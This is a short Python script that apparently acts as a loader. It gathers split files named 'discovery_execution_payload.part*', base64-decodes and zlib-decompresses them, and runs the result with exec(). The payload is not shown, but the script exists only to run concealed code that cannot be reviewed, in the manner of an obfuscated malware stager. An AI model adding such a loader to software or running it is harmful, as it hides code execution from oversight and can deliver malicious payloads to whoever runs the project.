from pathlib import Path
import base64
import zlib

root = Path(__file__).resolve().parent
payload = "".join(path.read_text(encoding="utf-8") for path in sorted(root.glob("discovery_execution_payload.part*")))
source = zlib.decompress(base64.b64decode(payload))
exec(compile(source, __file__, "exec"))
